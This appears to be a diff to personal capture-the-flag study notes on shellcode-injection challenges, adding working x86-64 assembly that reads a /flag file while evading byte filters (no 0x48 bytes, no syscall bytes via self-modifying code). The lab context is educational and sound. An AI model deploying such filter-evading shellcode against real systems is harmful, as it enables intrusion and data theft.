@@ -157,6 +157,30 @@ step one instruction(step over call):ni, NOT n
 
 ![](index.assets/image-20230308161613858.png)
 
+## Shellcode Injection: Common Challenges
+
+①memory access width
+
+- single byte: mov [rax], bl
+- 2-byte word: mov [rax], bx
+- 4-byte dword: mov [rax], ebx
+- 8-byte qword: mov [rax], rbx
+
+sometimes we should explicitly specify the size to avoid ambiguity. So like
+
+- single byte: mov **BYTE PTR** [rax], bl
+- 2-byte word: mov **WORD PTR** [rax], bx
+- 4-byte dword: mov **DWORD PTR** [rax], ebx
+- 8-byte qword: mov **QWORD PTR** [rax], rbx
+
+②forbidden byte
+
+![](index.assets/image-20230309134015663.png)
+
+![](index.assets/image-20230309134226499.png)
+
+**shl: Logical left shift instruction**
+
 ## babyshell
 
 **code injection**	=> This challenge reads in some bytes, modifies them , and executes them as code! Shellcode will be copied onto the stack and executed. Since the stack location is randomized on every execution, your shellcode will need to be *position-independent*.
@@ -300,3 +324,168 @@ flag:
         .ascii "/flag"
 ```
 
+level4: **This challenge requires that your shellcode have no H bytes**
+
+The "H bytes" is 0x48 in ASCII and we use the command below to dynamically see the variation.
+
+```shell
+gcc -static -nostdlib -o 1 1.s & objcopy --dump-section .text=out 1 & objdump -M intel -d 1 | grep 48
+```
+
+got:
+
+```shell
+  401000:       48 31 f6                xor    rsi,rsi
+  401021:       48 89 e7                mov    rdi,rsp
+  401024:       48 31 c0                xor    rax,rax
+  40102b:       48 89 c7                mov    rdi,rax
+  40102e:       48 89 e6                mov    rsi,rsp
+  401031:       48 31 d2                xor    rdx,rdx
+  401036:       48 31 c0                xor    rax,rax
+  40103b:       48 31 ff                xor    rdi,rdi
+  401041:       48 89 e6                mov    rsi,rsp
+  401044:       48 89 c2                mov    rdx,rax
+  401047:       48 31 c0                xor    rax,rax
+  40104e:       48 31 c0                xor    rax,rax
+  401053:       48 31 ff                xor    rdi,rdi
+```
+
+We can change the 64bits to 32bits to eliminate the `48`. Like the `xor rsi, rsi` , convert it to `xor esi, esi`. Like the `mov rdi, rax`, convert it to `mov edi, eax`.  Finally it looks like this: 
+
+```shell
+  401020:       48 89 e7                mov    rdi,rsp
+  40102b:       48 89 e6                mov    rsi,rsp
+  40103b:       48 89 e6                mov    rsi,rsp
+  401048:       b0 3c                   mov    al,0x3c
+```
+
+switch to 32-bit mode(edi, esp) but the command above is not easy to change. If we change `mov rdi, rsp` to `mov edi, esp` it will lose something because the address is 64-bit mode. 
+
+**figure out:** we can use the r8, r9 as the **intermediate transition** and r8, r9 won't create the `48`
+
+```assembly
+.global _start
+_start:
+.intel_syntax noprefix
+
+        #open
+        xor esi, esi
+        #lea rdi, [rip+flag]
+        mov byte ptr [rsp], '/'
+        mov byte ptr [rsp+1], 'f'
+        mov byte ptr [rsp+2], 'l'
+        mov byte ptr [rsp+3], 'a'
+        mov byte ptr [rsp+4], 'g'
+        xor cl, cl
+        mov byte ptr [rsp+5], cl
+        mov r8, rsp
+        mov rdi, r8
+        #mov rdi, rsp
+        #mov byte ptr [rsp+5], '\0'
+        xor eax, eax
+        mov al, 2
+        syscall
+
+        #read
+        mov edi, eax
+        mov r8, rsp
+        mov rsi, r8
+        #mov rsi, rsp
+        xor edx, edx
+        mov dl, 100
+        xor eax, eax
+        syscall
+
+        #write
+        xor edi, edi
+        mov dil, 1
+        mov r8, rsp
+        mov rsi, r8
+        #mov rsi, rsp
+        mov edx, eax
+        xor eax, eax
+        mov al, 1
+        syscall
+
+        #exit
+        xor eax, eax
+        mov al, 60
+        xor edi, edi
+        mov dil, 42
+        syscall
+
+flag:
+        .ascii "/flag"
+```
+
+level5: **the inputted data cannot contain any form of system call bytes (syscall, sysenter, int)**
+
+- This filter works by scanning through the shellcode for the following byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.
+
+```shell
+hacker@shellcode-injection-level-5:~/module6/5$ objdump -M intel -d 1 | grep "0f 05"
+  40102a:       0f 05                   syscall 
+  40103a:       0f 05                   syscall 
+  40104d:       0f 05                   syscall 
+  401058:       0f 05                   syscall
+```
+
+```
+#see how the code works
+cat out | strace /challenge/babyshell_level5
+```
+
+solution:
+
+```assembly
+.global _start
+.intel_syntax noprefix
+_start:
+        #fix up the syscalls-->significant
+        mov byte ptr [rip+syscall1], 0x0f
+        mov byte ptr [rip+syscall1+1], 0x05
+        mov byte ptr [rip+syscall2], 0x0f
+        mov byte ptr [rip+syscall2+1], 0x05
+        mov byte ptr [rip+syscall3], 0x0f
+        mov byte ptr [rip+syscall3+1], 0x05
+        mov byte ptr [rip+syscall4], 0x0f
+        mov byte ptr [rip+syscall4+1], 0x05
+        #open
+        mov rsi, 0
+        lea rdi, [rip+flag]
+        mov rax, 2
+syscall1:
+        .byte 0x13
+        .byte 0x37
+
+        #read
+        mov rdi, rax
+        mov rsi, rsp
+        mov rdx, 100
+        mov rax, 0
+syscall2:
+        .byte 0x13
+        .byte 0x37
+
+        #write
+        mov rdi, 1
+        mov rsi, rsp
+        mov rdx, rax
+        mov rax, 1
+syscall3:
+        .byte 0x13
+        .byte 0x37
+
+        #exit
+        mov rax, 60
+        mov rdi, 42
+syscall4:
+        .byte 0x13
+        .byte 0x37
+flag:
+        .ascii "/flag"
+```
+
+level6: **Removing write permissions from first 4096 bytes of shellcode**
+
+In order to get the flag, just directly add 4096 repeats in the front of the level5 code
